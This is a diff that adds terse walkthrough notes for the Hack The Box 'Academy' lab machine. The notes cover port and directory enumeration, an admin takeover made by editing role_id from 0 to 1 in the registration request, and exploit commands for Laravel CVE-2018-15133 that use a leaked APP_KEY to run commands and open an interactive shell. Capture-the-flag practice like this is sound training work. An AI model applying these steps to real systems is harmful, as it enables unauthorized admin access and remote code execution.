@@ -1,0 +1,45 @@
+HTB Academy:
+
+1-Enumeration:
+    PORT     STATE    SERVICE        REASON      VERSION
+    22/tcp   open     ssh            syn-ack     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+    80/tcp   open     http           syn-ack     Apache httpd 2.4.41 ((Ubuntu))
+    |_http-title: Did not follow redirect to http://academy.htb/
+    | http-methods: 
+    |_  Supported Methods: GET HEAD POST OPTIONS
+    |_http-server-header: Apache/2.4.41 (Ubuntu)
+    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+    
+    Enumeration port 80 - http://academy.htb:
+        dirbuster - File found: /index.php - 200
+        File found: /admin.php, /login.php - 200, /register.php,/config.php - 200
+
+        We register by Using Burpsuite:
+            we create a ticket and in the creaction account request we see:
+                role_id=0 (it means user)
+
+            We edit 'role_id' from 0 to 1
+                role_id=1
+            
+            We send the request 
+            We try to connect in admin.php 
+            We enter our creds:
+                It works, role_id value give us admin account
+
+            We find this link: 
+                http://dev-staging-01.academy.htb/
+    
+    
+    Enumeration Laravel Error Page:
+        laravel log exploit github I’ve found this CVE-2018–15133 
+            https://github.com/aljavier/exploit_laravel_cve-2018-15133
+
+    Exploit:
+        python3 pwn_laravel.py http://dev-staging-01.academy.htb/ dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= -c whoami
+
+        Permit us to invoke shell cmds
+
+        We will get interactive shell:
+            python3 pwn_laravel.py http://dev-staging-01.academy.htb/ dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= --interactive
+
